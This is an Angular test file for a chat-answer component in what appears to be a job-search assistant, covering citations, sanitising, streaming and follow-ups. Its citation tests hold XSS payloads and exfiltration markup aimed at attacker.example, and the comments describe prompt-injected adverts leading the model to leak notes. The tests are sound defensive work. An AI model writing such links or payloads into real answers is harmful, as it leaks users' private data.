import {provideHttpClient} from '@angular/common/http';
import {HttpTestingController, provideHttpClientTesting} from '@angular/common/http/testing';
import {Component} from '@angular/core';
import {ComponentFixture, TestBed} from '@angular/core/testing';
import {provideRouter, Router} from '@angular/router';
import {Events} from '@ngrx/signals/events';
import {ChatSource, ChatStep, ChatTurnState} from '@core/model/chat';
import {chatEvents} from '@core/store/chat.events';
import {ANSWER_RENDERER, AnswerContext, answerRenderer} from './answer-markdown';
import {ChatAnswer} from './chat-answer';

@Component({template: ''})
class Blank {}

/** Every attribute value under `root`, joined: where a fetching or navigating address would hide. */
function attributeValues(root: Element): string {
    return [...root.querySelectorAll('*')].flatMap((e) => [...e.attributes].map((a) => `${a.name}=${a.value}`)).join('\n');
}

const OFFER_12: ChatSource = {n: 1, kind: 'OFFER', id: 12, title: 'Senior Backend Engineer', source: 'Mailing list', date: '2026-08-04', archived: false};
const APPLICATION_3: ChatSource = {n: 2, kind: 'APPLICATION', id: 3, title: 'Backend Developer, logistics', source: 'Sent', date: '2026-08-22', archived: true};

const DONE_STEPS: readonly ChatStep[] = [
    {ordinal: 1, tool: 'search_offers', label: 'Searched offers Kafka', state: 'DONE', count: 5, durationMs: 600},
    {ordinal: 2, tool: 'application', label: 'Read the application', state: 'DONE', count: 2, durationMs: 200},
];

describe('ChatAnswer', () => {
    let fixture: ComponentFixture<ChatAnswer>;
    let router: Router;

    beforeEach(async () => {
        TestBed.configureTestingModule({
            providers: [
                provideRouter([
                    {path: 'dashboard', component: Blank},
                    {path: 'shortlist/:id', component: Blank},
                    {path: 'pipeline', component: Blank},
                ]),
            ],
        });
        router = TestBed.inject(Router);
        await router.navigateByUrl('/dashboard?chat=5');
        fixture = TestBed.createComponent(ChatAnswer);
        document.body.appendChild(fixture.nativeElement);
    });

    afterEach(() => (fixture.nativeElement as HTMLElement).remove());

    function render(answer: string, opts: {sources?: readonly ChatSource[]; steps?: readonly ChatStep[]; state?: ChatTurnState; last?: boolean} = {}): HTMLElement {
        fixture.componentRef.setInput('answer', answer);
        fixture.componentRef.setInput('sources', opts.sources ?? []);
        fixture.componentRef.setInput('steps', opts.steps ?? []);
        fixture.componentRef.setInput('state', opts.state ?? 'DONE');
        fixture.componentRef.setInput('turnId', 41);
        fixture.componentRef.setInput('last', opts.last ?? true);
        fixture.detectChanges();
        return fixture.nativeElement as HTMLElement;
    }

    const body = (root: HTMLElement) => root.querySelector('.lg-chat-md') as HTMLElement;

    describe('citations (ISC-429)', () => {
        const ANSWER =
            'The Kotlin role [1](cite:offer/12) is the only one. One id came back from no search ⟨unverified:4471⟩, ' +
            'and a knocked-out offer ⟨unverified:88⟩ is not linked either.';

        it('renders the returned id as a numbered pill linking to its offer, keeping ?chat', () => {
            const root = render(ANSWER, {sources: [OFFER_12]});
            const pills = [...body(root).querySelectorAll('a')];
            expect(pills).toHaveLength(1);
            expect(pills[0].textContent?.trim()).toBe('1');
            expect(pills[0].classList).toContain('lg-chat-cite');
            expect(pills[0].getAttribute('href')).toBe('/shortlist/12?chat=5');
        });

        it('renders an id no tool returned and a knocked-out one as unverified text, never a link', () => {
            const root = render(ANSWER, {sources: [OFFER_12]});
            const marks = [...body(root).querySelectorAll('.lg-chat-unverified')];
            expect(marks.map((m) => m.textContent?.replace(/\s+/g, ' ').trim())).toEqual(['4471 unverified', '88 unverified']);
            for (const mark of marks) expect(mark.closest('a')).toBeNull();
            expect(body(root).querySelectorAll('a[href*="4471"], a[href*="88"]')).toHaveLength(0);
        });

        it('follows a pill through the router, the drawer staying open', async () => {
            const root = render(ANSWER, {sources: [OFFER_12]});
            (body(root).querySelector('a.lg-chat-cite') as HTMLAnchorElement).click();
            await fixture.whenStable();
            expect(router.url).toBe('/shortlist/12?chat=5');
        });

        it('links an application citation to the application board', () => {
            const root = render('Sent last month [2](cite:application/3).', {sources: [APPLICATION_3]});
            expect(body(root).querySelector('a.lg-chat-cite')?.getAttribute('href')).toBe('/pipeline?chat=5');
        });

        it('renders Markdown and drops a script and an inline handler (ISC-435)', () => {
            const root = render('**bold** and a list:\n\n- one\n- two\n\n<script>window.x = 1</script><img src="x" onerror="window.x = 2">');
            expect(body(root).querySelector('strong')?.textContent).toBe('bold');
            expect(body(root).querySelectorAll('li')).toHaveLength(2);
            expect(root.querySelector('script')).toBeNull();
            expect(root.querySelector('[onerror]')).toBeNull();
        });

        // An advert title can carry a prompt injection; an image the answer names would be fetched
        // on render, its URL carrying whatever the model put in it.
        it('renders nothing that fetches: no image, media, form, frame, style or srcset survives', () => {
            const root = render(
                'Here ![leak](https://attacker.example/?d=notes) and <img src="https://attacker.example/i">' +
                    '<picture><source srcset="https://attacker.example/s"></picture>' +
                    '<video src="https://attacker.example/v" poster="https://attacker.example/p"></video><audio src="https://attacker.example/a"></audio>' +
                    '<svg><image href="https://attacker.example/g"/></svg><iframe src="https://attacker.example/f"></iframe>' +
                    '<object data="https://attacker.example/o"></object><embed src="https://attacker.example/e">' +
                    '<form action="https://attacker.example/x"><input name="q"><button>go</button></form>' +
                    '<style>p{background:url(https://attacker.example/c)}</style><link rel="stylesheet" href="https://attacker.example/l">' +
                    '<meta http-equiv="refresh" content="0;url=https://attacker.example/m">' +
                    '<span style="background:url(https://attacker.example/b)">styled</span>' +
                    '<table background="https://attacker.example/t"><tr><td>cell</td></tr></table> ⟨unverified:4471⟩',
            );
            const md = body(root);
            expect(md.querySelectorAll('img, picture, source, video, audio, image, iframe, object, embed, form, input, button, style, link, meta')).toHaveLength(0);
            expect(md.querySelectorAll('[style], [srcset], [background], [poster]')).toHaveLength(0);
            // Fix 3F-1: raw HTML is now shown as escaped text, so the address may be read but never
            // loaded — the assertion moved from the serialised string to every element's attributes.
            expect(attributeValues(md)).not.toContain('attacker.example');
            // The image is its alt text, and the one inline svg left is the unverified mark's own glyph.
            expect(md.textContent).toContain('leak');
            expect([...md.querySelectorAll('svg')].map((s) => s.getAttribute('class'))).toEqual(['lg-chat-unverified-icon']);
            expect(md.querySelector('.lg-chat-unverified svg.lg-chat-unverified-icon path')).not.toBeNull();
        });

        // Fix 2F-1 replaced "keeps http(s) and in-app links": a model-written link is the exfiltration
        // channel of a prompt-injected advert, so none stays clickable; every other scheme stays dead.
        it('keeps no model-written link: http(s) and in-app targets become text plus the address, every other scheme stays dead', () => {
            const root = render(
                '[web](https://example.org/a) [rel](/shortlist/4) [js](javascript:alert(1)) [data](data:text/html,<b>x</b>) ' +
                    '[call](tel:+490000000) <a href="javascript:alert(2)">raw</a> <a href="  JaVaScRiPt:alert(3)">spaced</a> ' +
                    '<a href="vbscript:x">vb</a> <a href="data:text/html;base64,PHNjcmlwdD4=">d</a>',
            );
            expect(body(root).querySelectorAll('a[href]')).toHaveLength(0);
            expect(body(root).textContent).toContain('web (example.org/a)');
            expect(body(root).textContent).toContain('rel (/shortlist/4)');
            expect(body(root).textContent).toContain('js');
            // Fix 3F-1: the raw anchors are visible text now; no attribute may carry the schemes.
            expect(attributeValues(body(root))).not.toMatch(/javascript:|vbscript:|data:text/i);
            expect(body(root).querySelectorAll('a')).toHaveLength(0);
        });

        // Fix 2F-1: an injected advert asks the model for a link whose query carries the notes it read.
        it('renders a planted exfiltration link as text with the address shown, never an anchor that navigates', async () => {
            const leak = `https://attacker.example/collect?d=${'rate-95-note-cover-letter-'.repeat(4)}`;
            const root = render(
                `[Open the original posting](${leak}) and <a href="https://attacker.example/raw" target="_blank" rel="opener">raw</a> ` +
                    'and <a href="/shortlist/7">in-app</a> and a bare https://attacker.example/bare address.',
            );
            const md = body(root);
            expect(md.querySelectorAll('a[href], [target]')).toHaveLength(0);
            expect(md.textContent).toContain('Open the original posting (attacker.example/collect?d=');
            // Long addresses are truncated: the full query never reaches the text either.
            expect(md.textContent).not.toContain(leak.slice(8));
            expect(md.textContent).toContain('…');
            expect(md.textContent).toContain('raw');
            for (const a of md.querySelectorAll('a')) a.click();
            await fixture.whenStable();
            expect(router.url).toBe('/dashboard?chat=5');
        });

        // Fix 2F-2: class and data-* survive DOMPurify, so raw HTML could forge a verified pill.
        it('turns a pill or an unverified mark written as raw HTML into plain text that goes nowhere', async () => {
            const root = render(
                'Real [1](cite:offer/12). Forged <a class="lg-chat-cite" data-cite="offer/1337" href="/shortlist/1337?chat=5">2</a> ' +
                    '<a class="lg-chat-cite" data-cite="OFFER/1337" data-lg-mint="guess">3</a> ' +
                    '<span class="lg-chat-unverified lg-chat-cite" data-unverified="77" tabindex="0">77</span> ' +
                    '<span data-lg-glyph="x" data-cite="offer/5" data-foo="bar">g</span>',
                {sources: [OFFER_12]},
            );
            const md = body(root);
            expect([...md.querySelectorAll('a.lg-chat-cite')].map((a) => a.textContent?.trim())).toEqual(['1']);
            expect([...md.querySelectorAll('[data-cite]')].map((e) => e.getAttribute('data-cite'))).toEqual(['OFFER/12']);
            expect(md.querySelectorAll('.lg-chat-unverified, [data-unverified], [data-lg-mint], [data-lg-glyph], [data-foo]')).toHaveLength(0);
            expect(md.querySelectorAll('a[href]')).toHaveLength(1);
            // Fix 3F-1: the forgeries are not even elements any more, only their markup as text; the one
            // anchor is the real pill. Clicking everything else in the answer goes nowhere.
            expect(md.querySelectorAll('a')).toHaveLength(1);
            expect(md.textContent).toContain('<a class="lg-chat-cite" data-cite="offer/1337"');
            for (const element of md.querySelectorAll('*')) if (element.closest('a.lg-chat-cite') === null) (element as HTMLElement).click();
            md.click();
            await fixture.whenStable();
            expect(router.url).toBe('/dashboard?chat=5');
        });
    });

    describe('failure reasons (ISC-433)', () => {
        it('names a spent budget and spent rounds as limits under the partial answer', () => {
            fixture.componentRef.setInput('failure', 'error.chatBudget');
            let root = render('Half an answer', {state: 'INCOMPLETE'});
            expect(root.querySelector('.lg-chat-failure')?.textContent?.trim()).toBe('The chat has used its calls for today.');
            expect(body(root).textContent).toContain('Half an answer');

            fixture.componentRef.setInput('failure', 'error.chatRounds');
            root = render('Half an answer', {state: 'INCOMPLETE'});
            expect(root.querySelector('.lg-chat-failure')?.textContent?.trim()).toBe('The answer used all the searches one question may run.');

            // Fix 5F-8: a model failure carries the server's sentence, interpolated as text, never as markup.
            fixture.componentRef.setInput('failure', 'error.chatModel');
            fixture.componentRef.setInput('failureParams', {message: 'The model did not answer in time. <b>x</b>'});
            root = render('Half an answer', {state: 'INCOMPLETE'});
            const line = root.querySelector('.lg-chat-failure');
            expect(line?.textContent?.trim()).toBe('The answer stopped: The model did not answer in time. <b>x</b>');
            expect(line?.querySelector('b')).toBeNull();
            fixture.componentRef.setInput('failureParams', null);

            fixture.componentRef.setInput('failure', null);
            root = render('Whole', {state: 'DONE'});
            expect(root.querySelector('.lg-chat-failure')).toBeNull();
        });
    });

    describe('sources and steps (ISC-430)', () => {
        it('lists each source once, each a link to its offer or application', () => {
            const root = render('Two rows [1](cite:offer/12) and [2](cite:application/3), and again [1](cite:offer/12).', {
                sources: [OFFER_12, APPLICATION_3, OFFER_12],
                steps: DONE_STEPS,
            });
            const cards = [...root.querySelectorAll<HTMLAnchorElement>('.lg-chat-sources a.lg-chat-source')];
            expect(cards.map((c) => c.getAttribute('href'))).toEqual(['/shortlist/12?chat=5', '/pipeline?chat=5']);
            expect(cards[0].querySelector('.lg-chat-source-n')?.textContent?.trim()).toBe('1');
            expect(cards[0].querySelector('.lg-chat-source-title')?.textContent?.trim()).toBe('Senior Backend Engineer');
            expect(cards[1].textContent).toContain('Archived');
        });

        it('collapses the finished tool calls into one summary', () => {
            const root = render('Done.', {steps: DONE_STEPS});
            const details = root.querySelector('details.lg-chat-steps-done') as HTMLDetailsElement;
            expect(details).not.toBeNull();
            expect(details.open).toBe(false);
            expect(details.querySelector('summary')?.textContent?.replace(/\s+/g, ' ').trim()).toBe('Used 2 tools · 7 rows');
            expect(details.querySelectorAll('li')).toHaveLength(2);
        });

        it('shows a running step as its own row, outside the summary', () => {
            const root = render('', {
                state: 'STREAMING',
                steps: [DONE_STEPS[0], {ordinal: 2, tool: 'application', label: 'Reading your profile', state: 'RUNNING', count: null, durationMs: null}],
            });
            const running = root.querySelector('.lg-chat-step-running');
            expect(running?.textContent).toContain('Reading your profile');
            expect(running?.closest('details')).toBeNull();
        });
    });

    describe('copy and regenerate (ISC-440)', () => {
        const ANSWER = 'Two fit: [1](cite:offer/12) and [2](cite:application/3).';

        it('copies the stored Markdown plus the two source links', async () => {
            const writes: string[] = [];
            Object.defineProperty(navigator, 'clipboard', {
                configurable: true,
                value: {writeText: (text: string) => (writes.push(text), Promise.resolve())},
            });
            const root = render(ANSWER, {sources: [OFFER_12, APPLICATION_3]});
            (root.querySelector('.lg-chat-copy') as HTMLButtonElement).click();
            await fixture.whenStable();
            const origin = location.origin;
            expect(writes).toEqual([
                `${ANSWER}\n\n[1] Senior Backend Engineer: ${origin}/shortlist/12\n[2] Backend Developer, logistics: ${origin}/pipeline`,
            ]);
        });

        it('dispatches regenerateRequested for the last finished answer only', () => {
            const regenerated: number[] = [];
            TestBed.inject(Events).on(chatEvents.regenerateRequested).subscribe(({payload}) => regenerated.push(payload));
            let root = render(ANSWER, {sources: [OFFER_12], last: false});
            expect(root.querySelector('.lg-chat-regenerate')).toBeNull();
            root = render(ANSWER, {sources: [OFFER_12], state: 'STREAMING'});
            expect(root.querySelector('.lg-chat-regenerate')).toBeNull();
            root = render(ANSWER, {sources: [OFFER_12]});
            (root.querySelector('.lg-chat-regenerate') as HTMLButtonElement).click();
            expect(regenerated).toEqual([41]);
        });
    });
});

// Fix 3F-9: every streamed delta re-parsed and re-sanitised the whole answer, which is quadratic in its length.
describe('ChatAnswer rendering cost (fix 3F-9)', () => {
    let fixture: ComponentFixture<ChatAnswer>;
    let calls = 0;

    beforeEach(() => {
        calls = 0;
        TestBed.configureTestingModule({
            providers: [
                provideRouter([{path: 'shortlist/:id', component: Blank}]),
                {
                    provide: ANSWER_RENDERER,
                    useValue: (context: AnswerContext) => {
                        const render = answerRenderer(context);
                        return (markdown: string) => {
                            calls++;
                            return render(markdown);
                        };
                    },
                },
            ],
        });
        fixture = TestBed.createComponent(ChatAnswer);
        document.body.appendChild(fixture.nativeElement);
    });

    afterEach(() => (fixture.nativeElement as HTMLElement).remove());

    const shown = () => ((fixture.nativeElement as HTMLElement).querySelector('.lg-chat-md')?.textContent ?? '').trim();

    it('renders a streaming answer once per interval rather than once per chunk, and still shows it growing', async () => {
        fixture.componentRef.setInput('state', 'STREAMING');
        let answer = '';
        for (let i = 0; i < 20; i++) {
            answer += `word${i} `;
            fixture.componentRef.setInput('answer', answer);
            fixture.detectChanges();
        }
        expect(calls).toBeLessThanOrEqual(2);
        expect(shown()).toContain('word0');

        // The trailing render brings the text up to date without another chunk arriving.
        await new Promise((resolve) => setTimeout(resolve, 150));
        fixture.detectChanges();
        expect(shown()).toBe(answer.trim());
        const streamed = calls;

        // The turn ends on the text already shown: nothing is parsed again.
        fixture.componentRef.setInput('state', 'DONE');
        fixture.detectChanges();
        expect(shown()).toBe(answer.trim());
        expect(calls).toBe(streamed);
    });

    it('renders a stored answer once, however often the view is checked or its other inputs change', () => {
        fixture.componentRef.setInput('answer', 'A **stored** answer [1](cite:offer/12).');
        fixture.componentRef.setInput('sources', [OFFER_12]);
        fixture.detectChanges();
        fixture.componentRef.setInput('last', true);
        fixture.componentRef.setInput('steps', DONE_STEPS);
        fixture.detectChanges();
        fixture.detectChanges();
        expect(calls).toBe(1);
        expect(shown()).toContain('stored');
    });
});

/**
 * Two or three questions to ask next beneath a finished answer (ISC-457), fetched from the server
 * for that turn; none under a stopped, an incomplete or a streaming one, and gone once the next
 * question is sent — which is when this turn stops being the last.
 */
describe('ChatAnswer follow-ups (ISC-457)', () => {
    const FOLLOWUPS = '/api/v1/chat/conversations/5/turns/41/followups';
    let fixture: ComponentFixture<ChatAnswer>;
    let http: HttpTestingController;

    beforeEach(async () => {
        TestBed.configureTestingModule({
            providers: [provideRouter([{path: 'dashboard', component: Blank}]), provideHttpClient(), provideHttpClientTesting()],
        });
        http = TestBed.inject(HttpTestingController);
        await TestBed.inject(Router).navigateByUrl('/dashboard?chat=5');
        fixture = TestBed.createComponent(ChatAnswer);
        document.body.appendChild(fixture.nativeElement);
    });

    afterEach(() => (fixture.nativeElement as HTMLElement).remove());

    async function render(state: ChatTurnState): Promise<void> {
        fixture.componentRef.setInput('answer', 'Two fit.');
        fixture.componentRef.setInput('state', state);
        fixture.componentRef.setInput('conversationId', 5);
        fixture.componentRef.setInput('turnId', 41);
        fixture.componentRef.setInput('last', true);
        await settle();
    }

    async function settle(): Promise<void> {
        fixture.detectChanges();
        await fixture.whenStable();
    }

    const followups = () => [...(fixture.nativeElement as HTMLElement).querySelectorAll<HTMLButtonElement>('button.lg-chat-followup')];

    it('shows two or three beneath a finished answer, each asking its sentence', async () => {
        await render('DONE');
        http.expectOne(FOLLOWUPS).flush([{text: 'Only the remote ones?'}, {text: 'Which pay the most?'}, {text: 'Any in Cologne?'}, {text: 'A fourth?'}]);
        await settle();

        expect(followups().map((b) => b.textContent?.trim())).toEqual(['Only the remote ones?', 'Which pay the most?', 'Any in Cologne?']);
        // Below the actions, never inside the answer's Markdown.
        expect((fixture.nativeElement as HTMLElement).querySelector('.lg-chat-md .lg-chat-followup')).toBeNull();

        const asked: string[] = [];
        const subscription = TestBed.inject(Events)
            .on(chatEvents.asked)
            .subscribe((event) => asked.push(event.payload));
        followups()[1].click();
        subscription.unsubscribe();
        expect(asked).toEqual(['Which pay the most?']);
    });

    for (const state of ['STOPPED', 'INCOMPLETE', 'STREAMING'] as const) {
        it('asks for none and shows none under a turn that is ' + state, async () => {
            await render(state);
            http.expectNone(FOLLOWUPS);
            expect(followups()).toHaveLength(0);
        });
    }

    it('is gone once the next question is sent', async () => {
        await render('DONE');
        http.expectOne(FOLLOWUPS).flush([{text: 'Only the remote ones?'}, {text: 'Which pay the most?'}]);
        await settle();
        expect(followups()).toHaveLength(2);

        // The next question makes the live turn the last one.
        fixture.componentRef.setInput('last', false);
        await settle();

        expect(followups()).toHaveLength(0);
        http.expectNone(FOLLOWUPS);
    });
});
